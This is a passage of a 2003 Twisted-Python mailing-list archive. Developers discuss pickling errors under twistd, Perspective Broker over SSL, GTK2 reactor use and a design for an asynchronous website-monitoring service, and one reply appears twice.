in runUntilCurrent
            call.func(*call.args, **call.kw)
        --- <exception caught here> ---
          File
"/usr/lib/python2.2/site-packages/twisted/internet/base.py", line 289,
in _continueSystemEvent
            callable(*args, **kw)
          File
"/usr/lib/python2.2/site-packages/twisted/internet/app.py", line 784, in
_afterShutDown
            self.save("shutdown")
          File
"/usr/lib/python2.2/site-packages/twisted/internet/app.py", line 745, in
save
            dumpFunc(self, f)
          File
"/usr/lib/python2.2/site-packages/twisted/internet/app.py", line 727, in
dumpFunc
            _dump(obj, file, 1)
        cPickle.PicklingError: Can't pickle
__builtin__.ServiceWebManager: it's not found as
__builtin__.ServiceWebManager

Do you know how to fix this?

Thanks,
Abe





From m at moshez.org  Mon Jul 14 21:22:07 2003
From: m at moshez.org (Moshe Zadka)
Date: 15 Jul 2003 03:22:07 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058236423.6090.5.camel@mingus>
References: <1058236423.6090.5.camel@mingus>, <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <20030715032207.14067.qmail@green.zadka.com>

On 14 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> Hmm, I guess I don't quite understand this.  Why should it matter if a
> services is being started by the parent or not?  Is there a chance the
> parent could think the service was still running when it really wasn't?

Yes.
The parent *will* call .startService/.stopService when it is appropriate.
So either make those callable twice in a row [unlike your example,
where it had a subtle bug in that case] or, better, use something orthogonal
like .enable/.disable. The advantage of .enable/.disable is that they
can keep in the service an attribute of "enabling desired" so that if
you restart the server, the service will stay disabled. Just make sure
__init__ sets .enabled=1, and have .startService check .enabled before
doing anything, etc...

> If I do this, I get an error on shutdown, as it tries to create a
> snapshot of the running app:

To avoid creating snapshorts, use the --no_save argument to twistd.

>         cPickle.PicklingError: Can't pickle
> __builtin__.ServiceWebManager: it's not found as
> __builtin__.ServiceWebManager

A better way, after you're beyond simply examples, is to put the
classes in a module. Even if you don't use the snapshots, they are
sometimes useful for post-mortem debugging.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Mon Jul 14 21:22:07 2003
From: m at moshez.org (Moshe Zadka)
Date: 15 Jul 2003 03:22:07 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058236423.6090.5.camel@mingus>
References: <1058236423.6090.5.camel@mingus>, <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <20030715032207.14067.qmail@green.zadka.com>

On 14 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> Hmm, I guess I don't quite understand this.  Why should it matter if a
> services is being started by the parent or not?  Is there a chance the
> parent could think the service was still running when it really wasn't?

Yes.
The parent *will* call .startService/.stopService when it is appropriate.
So either make those callable twice in a row [unlike your example,
where it had a subtle bug in that case] or, better, use something orthogonal
like .enable/.disable. The advantage of .enable/.disable is that they
can keep in the service an attribute of "enabling desired" so that if
you restart the server, the service will stay disabled. Just make sure
__init__ sets .enabled=1, and have .startService check .enabled before
doing anything, etc...

> If I do this, I get an error on shutdown, as it tries to create a
> snapshot of the running app:

To avoid creating snapshorts, use the --no_save argument to twistd.

>         cPickle.PicklingError: Can't pickle
> __builtin__.ServiceWebManager: it's not found as
> __builtin__.ServiceWebManager

A better way, after you're beyond simply examples, is to put the
classes in a module. Even if you don't use the snapshots, they are
sometimes useful for post-mortem debugging.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From exarkun at intarweb.us  Mon Jul 14 22:18:47 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Tue, 15 Jul 2003 00:18:47 -0400
Subject: [Twisted-Python] Changes to twisted.mail
Message-ID: <20030715041847.GA29473@intarweb.us>

  This evening I checked in a fair number of changes to twisted.mail and
twisted.protocols.smtp.  Much of it was to take advantage of the features
I've recently added to Twisted's SMTP support (such as ESMTP AUTH), but a
fair amount was to clarify, simplify, and generally clean up the interfaces
used by this part of Twisted.

  Wherever possible, I have left in checks for the old behavior which issue
deprecation warnings and "upgrade" the data to the new requirements.  I hope
I have covered all the cases, but since the previous interface wasn't as
precisely specified as one might hope, and maybe because I just plain made
some mistakes, it is possible that these changes will break existing code
that uses the interfaces.

  Understandably, this backwards compatibility complicates the mail code --
extremely in some places -- and I would like to remove it as quickly as
possible.  Feedback on timeline requirements from anyone using this code
would be appreciated.

  So, this is a heads up.  I hope anyone who is seriously using Twisted's
mail code can test their projects against current CVS HEAD and let me know
if I've broken something.  Test cases that codify the old, now broken,
behavior are most welcome (well, patches that *fix* the breakage are even
more welcome ;), but tracebacks might get you some assistance too.

  Enjoy,

  Jp

-- 
Examinations are formidable even to the best prepared, for
even the greatest fool may ask more the the wisest man can answer.
                -- C.C. Colton
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030715/9980078c/attachment.sig>

From iko at cd.chalmers.se  Tue Jul 15 06:42:56 2003
From: iko at cd.chalmers.se (Anders Hammarquist)
Date: Tue, 15 Jul 2003 14:42:56 +0200
Subject: [Twisted-Python] IMAP BODYSTRUCTURE format & the email.Messages 
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130212AAFE@its-xchg4.massey.ac.nz> 
References: <1ED4ECF91CDED24C8D012BCF2B034F130212AAFE@its-xchg4.massey.ac.nz> 
Message-ID: <200307151242.h6FCgud24631@haddock.cd.chalmers.se>

In a message of Fri, 11 Jul 2003 18:14:07 +1200, "Tony Meyer" writes:
>Does anyone know of existing code to convert/format/flatten an email.Message
>into the correct format for IMAP's BODYSTRUCTURE request?  (it basically
>breaks down all the MIME parts of the message).  It can use twisted or
>imaplib, or neither, I don't care.

This is intended to be used from Twisted's imap server, but can probably
be adapted to other uses. It probably doesn't work out-of-the box (as I've
adapted it from a larger piece of code, and it's not a runnable example),
but it does produce something at least resembling what the RFC says it
should look like. Usage: You call getBody() from within IMailbox.fetch(),
setting ext to True if it is a BODYSTRUCTURE fetch. (self is a private
Message-type class, not the IMailbox, though it could probably be.)

Enjoy (and please let me know of any bugs in it).

/Anders

-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: text/x-python
Size: 4191 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030715/b11aa66d/attachment-0002.py>
-------------- next part --------------
-- 
 -- Of course I'm crazy, but that doesn't mean I'm wrong.
Anders Hammarquist                                  | iko at cd.chalmers.se
Physics student, Chalmers University of Technology, | Hem: +46 31 88 48 50
G|teborg, Sweden.           RADIO: SM6XMM and N2JGL | Mob: +46 707 27 86 87

From mesozoic at polynode.com  Tue Jul 15 09:47:05 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Tue, 15 Jul 2003 11:47:05 -0400
Subject: [Twisted-Python] Fear and Loathing in Twisted Web and Woven
Message-ID: <20030715154705.GN13205@polynode.com>

I have a specific question and a more general plea for help here, in that
order:

1) I'd like to set certain configuration elements of my site (like "site name",
"template directory", etc.) within my root .rpy, then read them in my Page
classes, wmfactory_* methods, and so forth. Donovan suggested I look at the
registry or the request.site objects, and that advice is as far as I've
gotten.

The registry, as far as I can tell, is not passed to child objects returned
by static.File.getChild. So I'm not sure how I could access that from
within my own classes.

The request, on the other hand, is not accessible from the .rpy. I've tried
registry.getComponent(server.Site) and registry.getComponent(server.Request)
and they both return None. So I'm lost.

Am I simply taking the wrong approach (again) to what I'm trying to do? My
current workaround is to put 'child.registry=self.registry' in
static.File.getChild, before it returns child, but this is a kludge and I
know it.

2) In general, I'm not sure how to write my app anymore, and could use some
help. If you have a minute to read, here's a more about what I'm doing:

I've been using .trp files to store my data, and some have asked me why. I
have complicated data that represents pages on my site. Photo albums, link
collections, etc. I would like to store this data as part of a flat file
hierarchy, so that it resides alongside .html, .stxt, .jpg, and so forth.

I also didn't want to pickle my models; this has caused problems in the
past. So I have Data classes, which are adapted to IModel and IResource with
my custom Model and Page classes (respectively). I store the data files as
.trp, and when somebody navigates to /foo/bar.trp, whichever adapter I've
specified in code is automatically used. I like this; it avoids having to
write static.File processors, which are in my opinion ugly (and not very
scalable).

I am open to suggestions and comments. My goal is to have a flexible code
base on top of which I can expand my personal page, while keeping everything
within a single directory. If this is a pipe dream, and I should be writing
PhotoAlbumContainers and creating them in my root .rpy and moving my links
around so that static files and dynamic pages are hierarchically separated,
somebody tell me (and tell me why).

I really am looking for guidance on this; my first Twisted app (which
currently powers my web page) is a kludgy nasty hack, and I want to make
this ultra-refactoring as clean and "pure" as possible.

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From abe at fettig.net  Tue Jul 15 10:52:30 2003
From: abe at fettig.net (Abe Fettig)
Date: 15 Jul 2003 12:52:30 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030715032207.14067.qmail@green.zadka.com>
References: <1058236423.6090.5.camel@mingus>
	 , <1058035798.1298.18.camel@mingus> , <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
	 <20030715032207.14067.qmail@green.zadka.com>
Message-ID: <1058287949.15783.29.camel@mingus>

On Mon, 2003-07-14 at 23:22, Moshe Zadka wrote:
> >         cPickle.PicklingError: Can't pickle
> > __builtin__.ServiceWebManager: it's not found as
> > __builtin__.ServiceWebManager
> 
> A better way, after you're beyond simply examples, is to put the
> classes in a module. Even if you don't use the snapshots, they are
> sometimes useful for post-mortem debugging.

Right, in a real app I'd have my classes in seperate modules.  I'm just
trying to demonstrate a Twisted app by putting everything in the same
file.  Is this really not possible?

(I also tried running the app without passing save=0.  When I kill it,
it creates a file named "Test App-shutdown.tap".  But if I try to run
this using "twistd -nf Test\ App-shutdown.tap", I get another error:
Failed to load application: <twisted.persisted.styles.Ephemeral instance
at 0x819ebf4> is not safe for unpickling)

Honestly it doesn't bother me if I can't support pickling in this
example.  But from the comments on this list it seems like making an app
pickleable is very important, so in the interests of doing things the
Twisted Way I'd like to get it working.

Abe






From m at moshez.org  Tue Jul 15 12:11:55 2003
From: m at moshez.org (Moshe Zadka)
Date: 15 Jul 2003 18:11:55 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058287949.15783.29.camel@mingus>
References: <1058287949.15783.29.camel@mingus>, <1058236423.6090.5.camel@mingus>
	 , <1058035798.1298.18.camel@mingus> , <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
	 <20030715032207.14067.qmail@green.zadka.com>
Message-ID: <20030715181155.13082.qmail@green.zadka.com>

On 15 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> Right, in a real app I'd have my classes in seperate modules.  I'm just
> trying to demonstrate a Twisted app by putting everything in the same
> file.  Is this really not possible?

Yes, pickling and putting classes in the config file are incompatible.
This makes perfect sense if you consider that pickles saves classes
by reference, and there is no reason it will be able to find your
file to load the code from them. Making class picklable is not important
while testing -- feel free to run with --no_save during early development
stages, especially for demonstrations. I tend to have serious allergies
to putting class definitions in the config file anyway :)
Anyway, not only is this limitation inherent, nobody has plans to
make it go away.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From abe at fettig.net  Tue Jul 15 13:00:42 2003
From: abe at fettig.net (Abe Fettig)
Date: 15 Jul 2003 15:00:42 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030715181155.13082.qmail@green.zadka.com>
References: <1058287949.15783.29.camel@mingus>
	 , <1058236423.6090.5.camel@mingus> , <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
	 <20030715032207.14067.qmail@green.zadka.com>
	 <20030715181155.13082.qmail@green.zadka.com>
Message-ID: <1058295642.16032.31.camel@mingus>

On Tue, 2003-07-15 at 14:11, Moshe Zadka wrote:

> Yes, pickling and putting classes in the config file are incompatible.
> This makes perfect sense if you consider that pickles saves classes
> by reference, and there is no reason it will be able to find your
> file to load the code from them. Making class picklable is not important
> while testing -- feel free to run with --no_save during early development
> stages, especially for demonstrations. I tend to have serious allergies
> to putting class definitions in the config file anyway :)
> Anyway, not only is this limitation inherent, nobody has plans to
> make it go away.

That makes sense.  Thanks for the explanation!

Abe




From ok at mailcall.com.au  Wed Jul 16 03:23:12 2003
From: ok at mailcall.com.au (Omar Kilani)
Date: 16 Jul 2003 19:23:12 +1000
Subject: [Twisted-Python] Random Thinking
Message-ID: <1058347391.5578.38.camel@psyche.mailcall.com.au>

Hello World,

I'm planning a distributed network management system. I know I'll be
using Python, and PyGTK2 as the frontend (=client) to the system.

What I'd like to do is use the Perspective Broker in Twisted (as well as
all the other wonderful modules provided!) to implement the client <->
server and server <-> server systems (the servers can talk among each
other to reach quorum, etc.)

I had a few questions:

The Perspective Broker documentation states that it's "secure". 
How is it secure? Does it run over SSL? Can it? 

Am I able to reject connections with untrusted SSL certificates? 

Am I able to trust certificates programmatically? I want give the client
a list of servers that are untrusted, and when the user clicks 'Trust',
the connection is then permitted.

Is it possible to multicast from server --> n*client? 

Can I call methods on the client from the server? (so that the server
can push information to the client asynchronously.)

How's the stability of the GTK2 compatible Perspective Broker code in
Twisted?

Has anyone ever attempted to integrate Spread (www.spread.org) with
Twisted and use it as the transport?

That's all I can think of for now. Thanks for your help!

Best Regards,
Omar Kilani




From m at moshez.org  Wed Jul 16 04:06:12 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 10:06:12 -0000
Subject: [Twisted-Python] Random Thinking
In-Reply-To: <1058347391.5578.38.camel@psyche.mailcall.com.au>
References: <1058347391.5578.38.camel@psyche.mailcall.com.au>
Message-ID: <20030716100612.2033.qmail@green.zadka.com>

On 16 Jul 2003, Omar Kilani <ok at mailcall.com.au> wrote:

> The Perspective Broker documentation states that it's "secure". 

That means that malicious clients can't [hopefully] compromise servers,
and malicious servers can't compromise clients. That has nothing
to do with SSL. In fact, one day I intend to write a long rant
about why cryptography has little to do with security.

> How is it secure? Does it run over SSL? Can it? 

It can run over SSL, yes. listenSSL and getObjectAtSSL work
well enough for that.

> Am I able to reject connections with untrusted SSL certificates? 

You'd need to work a little bit for that. I estimate an overhead
of about 10 lines compared to what you had to do if we actually
engineered it correctly :(
[Summary: inherit from pb.Broker to do that check in connectionMade,
inherit from pb.BrokerFactoy to build your inherited Broker rather
than pb.Broker]

> Am I able to trust certificates programmatically? I want give the client
> a list of servers that are untrusted, and when the user clicks 'Trust',
> the connection is then permitted.

This is probably an issue of pyOpenSSL, because that's the underlying
layer for what Twisted uses. You will also probably want to save it
somewhere: Twisted is somewhat  on this issue. You will need to decide
where to save. Of course, files work :)

> Is it possible to multicast from server --> n*client? 

Not with PB. PB is TCP based, multicast is UDP based. Twisted does
support UDP, but you'll have to build your own layer on top of it.
Of course, you can still use jelly, which is the secure marshaller used
internally by PB. Of course, UDP is inherently insecure in that
malicious meddlers can do whatever they want to it [listen in, capture
packets, etc.] You can, of course, encrypt/sign the jellied packets
you multicast using packages like pycrypto.

> Can I call methods on the client from the server? (so that the server
> can push information to the client asynchronously.)

Yes.
You should probably convince yourself to stop saying the word "server"
or "client". There's little difference between them, except the server
gives the client an initial object reference.

> How's the stability of the GTK2 compatible Perspective Broker code in
> Twisted?

There's no relationship between GTK2 and PB. GTK2 looks to Twisted like
a reactor -- basically, something very low-level, pushing the bits.
Perspective Broker is all protocol-level code, which means it only
cares someone is pushing the bits. Of course, there are specific GUI
classes for PB-based authentication, but there is a good chance you
won't want them.
 
> Has anyone ever attempted to integrate Spread (www.spread.org) with
> Twisted and use it as the transport?

Not to my knowledge.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From ok at mailcall.com.au  Wed Jul 16 06:00:18 2003
From: ok at mailcall.com.au (Omar Kilani)
Date: Wed, 16 Jul 2003 22:00:18 +1000 (EST)
Subject: [Twisted-Python] Random Thinking
In-Reply-To: <20030716100612.2033.qmail@green.zadka.com>
Message-ID: <Pine.LNX.4.21.0307162132430.15482-100000@adm1.mailcall.com.au>

On 16 Jul 2003, Moshe Zadka wrote:

> On 16 Jul 2003, Omar Kilani <ok at mailcall.com.au> wrote:
> 
> > The Perspective Broker documentation states that it's "secure". 
> 
> That means that malicious clients can't [hopefully] compromise servers,
> and malicious servers can't compromise clients. That has nothing
> to do with SSL. In fact, one day I intend to write a long rant
> about why cryptography has little to do with security.

I understand that SSL doesn't make something secure. I just ment does it
encrypt the data in some way? Etc. I actually just wanted a method of
determining that the machine is who it says it is. And SSL solves that
problem nicely (or some form of PKI.)

> 
> > How is it secure? Does it run over SSL? Can it? 
> 
> It can run over SSL, yes. listenSSL and getObjectAtSSL work
> well enough for that.
> 

Ah. My fault, I didn't see getObjectAtSSL. Sorry.

> > Am I able to reject connections with untrusted SSL certificates? 
> 
> You'd need to work a little bit for that. I estimate an overhead
> of about 10 lines compared to what you had to do if we actually
> engineered it correctly :(
> [Summary: inherit from pb.Broker to do that check in connectionMade,
> inherit from pb.BrokerFactoy to build your inherited Broker rather
> than pb.Broker]
> 

OK. Thanks.

> > Am I able to trust certificates programmatically? I want give the client
> > a list of servers that are untrusted, and when the user clicks 'Trust',
> > the connection is then permitted.
> 
> This is probably an issue of pyOpenSSL, because that's the underlying
> layer for what Twisted uses. You will also probably want to save it
> somewhere: Twisted is somewhat  on this issue. You will need to decide
> where to save. Of course, files work :)
> 
> > Is it possible to multicast from server --> n*client? 
> 
> Not with PB. PB is TCP based, multicast is UDP based. Twisted does
> support UDP, but you'll have to build your own layer on top of it.
> Of course, you can still use jelly, which is the secure marshaller used
> internally by PB. Of course, UDP is inherently insecure in that
> malicious meddlers can do whatever they want to it [listen in, capture
> packets, etc.] You can, of course, encrypt/sign the jellied packets
> you multicast using packages like pycrypto.
>

OK. I don't really mean "multicast". I mean somehow call the same methods
with the same data on a bunch of different "clients" (OK, how do I
describe the non-servers? :-)

Can I do this efficiently? Is there a need to even worry about it?
Should I just:

for connect in connects:
	connect.callRemote(...)
 
> > Can I call methods on the client from the server? (so that the server
> > can push information to the client asynchronously.)
> 
> Yes.
> You should probably convince yourself to stop saying the word "server"
> or "client". There's little difference between them, except the server
> gives the client an initial object reference.
>

I'll try. I don't know how else to describe them. :-)
What I really meant was: can I callRemote from the initial object
reference provider to the ... "client"?
 
> > How's the stability of the GTK2 compatible Perspective Broker code in
> > Twisted?
> 
> There's no relationship between GTK2 and PB. GTK2 looks to Twisted like
> a reactor -- basically, something very low-level, pushing the bits.
> Perspective Broker is all protocol-level code, which means it only
> cares someone is pushing the bits. Of course, there are specific GUI
> classes for PB-based authentication, but there is a good chance you
> won't want them.
>

OK. What I really meant (hehe) was: Is the GTK2 reactor code stable?
Should I be aware of any surprises it might present?
Are there examples of usage?
Is calling gtk2reactor.install() all I need to do?
  
> > Has anyone ever attempted to integrate Spread (www.spread.org) with
> > Twisted and use it as the transport?
> 
> Not to my knowledge.
> 
> 

OK. I've only just started looking at Twisted. So some of my questions may
seem rather superfluous. There's a lot in Twisted, and I'm trying to get
my head around it.

Thanks for your help.

Regards,
Omar Kilani




From m at moshez.org  Wed Jul 16 06:37:21 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 12:37:21 -0000
Subject: [Twisted-Python] Random Thinking
In-Reply-To: <Pine.LNX.4.21.0307162132430.15482-100000@adm1.mailcall.com.au>
References: <Pine.LNX.4.21.0307162132430.15482-100000@adm1.mailcall.com.au>
Message-ID: <20030716123721.6924.qmail@green.zadka.com>

On Wed, 16 Jul 2003, Omar Kilani <ok at mailcall.com.au> wrote:

> I understand that SSL doesn't make something secure. I just ment does it
> encrypt the data in some way? Etc. I actually just wanted a method of
> determining that the machine is who it says it is. And SSL solves that
> problem nicely (or some form of PKI.)

Then why not say what you mean. "I need to cryptographically ascertain
identities". Yes, SSL is decent for that. But Twisted developers (try to)
use terminology correctly. When we say secure, we mean "cannot be compromised
[as far as we know]".
 
> OK. I don't really mean "multicast".

Again, try to use the terminology everybody else does. Or, at least,
invent your own words which lack any pre-assumed meanings. Otherwise,
you'll run the risk of people replying to questions you didn't ask.

> Can I do this efficiently? Is there a need to even worry about it?

You should never worry about efficiency before you have proof you
need it. Did nobody quote Knuth at you?

> Should I just:
> 
> for connect in connects:
> 	connect.callRemote(...)

That looks sane.

> I'll try. I don't know how else to describe them. :-)

"peers"

> What I really meant was: can I callRemote from the initial object
> reference provider to the ... "client"?

Perspective Broker is fully symmetric, but needs objects.
If you do that, you probably actually want perspectives -- and the
answer is yes, it is possible to have that abstraction.

> OK. What I really meant (hehe) was: Is the GTK2 reactor code stable?

It runs the tests, but nobody is using it for production applications,
as far as I know.

> Should I be aware of any surprises it might present?

Hopefully, not.

> Are there examples of usage?
> Is calling gtk2reactor.install() all I need to do?

NO!
What you should do is write an Application, and then use
% twistd --reactor gtk2 -n -y yourapplication.tpy
There is absolutely no need for any of your code to access the
gtk2reactor module. Of course, your code may not run correctly
without it -- for example, opening windows will probably not work.
But that is still no excuse for any of your code to manually import
gtk2reactor, and risk it being too late.

In general, note that Twisted is properly modularized so that
you *can* do stuff like gtk2reactor.install(). But you shouldn't:
you should use the official blessed way to do it. Just assume
we have an official blessed way for a reason, and even if there's
no reason, you don't want idiosyncracies in your code. Code with
fingerprints on it is no better than glass with fingerprints on it.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From egor at iplus.ru  Wed Jul 16 08:31:28 2003
From: egor at iplus.ru (Egor Cheshkov)
Date: Wed, 16 Jul 2003 18:31:28 +0400
Subject: [Twisted-Python] Passing mx.DateTime objects to PB
Message-ID: <200307161831.28533.egor@iplus.ru>

Hello! Another beginner's question. How can I pass mx.DateTime objects to and 
from PB remote method calls? Should I create a subclass of mx.DateTime and 
pb.Copyable?

-- 
Egor Cheshkov 





From brad at bbnet.ca  Wed Jul 16 09:25:20 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 11:25:20 -0400
Subject: [Twisted-Python] How Twisted is This?
Message-ID: <20030716152520.GA19537@xdsk200>

Hi,

I'm evaluating Twisted for the networking component of a web server
monitoring service. Eventually, this service will support monitoring
pretty much any TCP-enabled device. 

I want to figure out whether Twisted is applicable to my problem.

This web monitoring system will be:

* branded for the company I work for 

* multiuser 

* offer various ways of verifying the uptime and integrity of content on
a site:

    i. Can I open an HTTP connection to this site?
    ii. Is "foo bar" present on the page that I've retrieved?
    iii. Is the page I've retrieved the same size as it was before?
    iv. Is Basic Auth still working with this username/password? (for
    pages that do Basic Auth, of course :)

...and so forth.

So, my main use case (possibly) relevant to Twisted would be:

I write a "monicron". monicron wakes up every five minutes and asks the
system "are there any monitors that need to be performed right now?" The
answer will either be "Yes, here's the monitors that need to be
performed right now" or "No".

If No, monicron will just go back to bed for another five minutes.

If the answer is Yes monicron will gather the monitors that need to be
run, and execute the all at once -- asyncronously. It would then need to
collect the results of all the monitors, and once they've all reported
back for a given site, send an error report if something went wrong.

1. Does this sound Twisted?

2. If Yes, where should I start looking for the bits of the framework
that will make my task as easy as possible?

--
Brad Bollenbach



From ivo at amaze.nl  Wed Jul 16 09:45:04 2003
From: ivo at amaze.nl (Ivo van der Wijk)
Date: Wed, 16 Jul 2003 17:45:04 +0200
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716152520.GA19537@xdsk200>; from brad@bbnet.ca on Wed, Jul 16, 2003 at 11:25:20AM -0400
References: <20030716152520.GA19537@xdsk200>
Message-ID: <20030716174504.V15104@amaze.nl>

On Wed, Jul 16, 2003 at 11:25:20AM -0400, Brad Bollenbach wrote:
> Hi,
> 
> I'm evaluating Twisted for the networking component of a web server
> monitoring service. Eventually, this service will support monitoring
> pretty much any TCP-enabled device. 
> 
> I want to figure out whether Twisted is applicable to my problem.
> 
> This web monitoring system will be:
> 
> * branded for the company I work for 
> 
> * multiuser 
> 
> * offer various ways of verifying the uptime and integrity of content on
> a site:
> 
>     i. Can I open an HTTP connection to this site?
>     ii. Is "foo bar" present on the page that I've retrieved?
>     iii. Is the page I've retrieved the same size as it was before?
>     iv. Is Basic Auth still working with this username/password? (for
>     pages that do Basic Auth, of course :)
> 

I've written a HTTP watchdog using Twisted that does something like this:

- can I connect
- can I HEAD / and get a result
- does all of this happen in the correct time interval

The watchdog resets the service if it is not responding, and keeps track
of some statistics to avoid continuous restarting.

> ...and so forth.
> 
> So, my main use case (possibly) relevant to Twisted would be:
> 
> I write a "monicron". monicron wakes up every five minutes and asks the
> system "are there any monitors that need to be performed right now?" The
> answer will either be "Yes, here's the monitors that need to be
> performed right now" or "No".
> 
> If No, monicron will just go back to bed for another five minutes.
> 
> If the answer is Yes monicron will gather the monitors that need to be
> run, and execute the all at once -- asyncronously. It would then need to
> collect the results of all the monitors, and once they've all reported
> back for a given site, send an error report if something went wrong.
> 
> 1. Does this sound Twisted?
> 

Somewhat. You need to make very sure your system doesn't block unexpectedly :)

> 2. If Yes, where should I start looking for the bits of the framework
> that will make my task as easy as possible?
> 

I have a rather ugly Twisted script which might give you a start (it does the 
checking at intervals, gathering results / setting timeouts, etc).

If you're interested, I could try to cleanup the code a bit.

Cheers

	Ivo

-- 
Drs. I.R. van der Wijk                                      -=-              
Korte Leidsedwarsstraat 12                     Amaze Internet Services V.O.F.
1017 RC Amsterdam, NL                                       -=-              
T +31-20-4688336         F +31-20-4688337        Linux/Web/Zope/SQL/MMBase   
W http://www.amaze.nl    E info at amaze.nl             Network Solutions        
W http://vanderwijk.info E ivo at amaze.nl                 Consultancy          
PGP http://vanderwijk.info/pgp                              -=-              



From smurf at smurf.noris.de  Wed Jul 16 09:47:05 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Wed, 16 Jul 2003 17:47:05 +0200
Subject: [Twisted-Python] How Twisted is This?
References: <20030716152520.GA19537@xdsk200>
Message-ID: <pan.2003.07.16.15.47.03.115396@smurf.noris.de>

Hi, Brad Bollenbach wrote:

> I write a "monicron". monicron wakes up every five minutes and asks the
> system "are there any monitors that need to be performed right now?" The
> answer will either be "Yes, here's the monitors that need to be
> performed right now" or "No".

Why don't you write a function that finds the earliest monitor job which
needs to run next, and delay for exactly that amount?

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
Nice guys finish last.
		-- Leo Durocher




From m at moshez.org  Wed Jul 16 09:49:07 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 15:49:07 -0000
Subject: [Twisted-Python] Passing mx.DateTime objects to PB
In-Reply-To: <200307161831.28533.egor@iplus.ru>
References: <200307161831.28533.egor@iplus.ru>
Message-ID: <20030716154907.13430.qmail@green.zadka.com>

On Wed, 16 Jul 2003, Egor Cheshkov <egor at iplus.ru> wrote:

> Hello! Another beginner's question. How can I pass mx.DateTime objects to and 
> from PB remote method calls? Should I create a subclass of mx.DateTime and 
> pb.Copyable?

A. Did everyone drink copying juice today or something? Stop copying classes,
people. Most of the time, you want remote references. Really.

B. In both cases, you can go either the inheritance or the containment
route. Which one you take is up to you.

C. It doesn't appear that Jelly or PB support components, precluding
that strategy. Am I wrong? Is there a way to use components?
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Wed Jul 16 09:52:50 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 15:52:50 -0000
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716152520.GA19537@xdsk200>
References: <20030716152520.GA19537@xdsk200>
Message-ID: <20030716155250.13563.qmail@green.zadka.com>

On Wed, 16 Jul 2003, Brad Bollenbach <brad at bbnet.ca> wrote:

> * branded for the company I work for 

I'm not sure what this means.

> * multiuser 

I'm not sure what this mean either.

> * offer various ways of verifying the uptime and integrity of content on
> a site:
> 
>     i. Can I open an HTTP connection to this site?
>     ii. Is "foo bar" present on the page that I've retrieved?
>     iii. Is the page I've retrieved the same size as it was before?
>     iv. Is Basic Auth still working with this username/password? (for
>     pages that do Basic Auth, of course :)

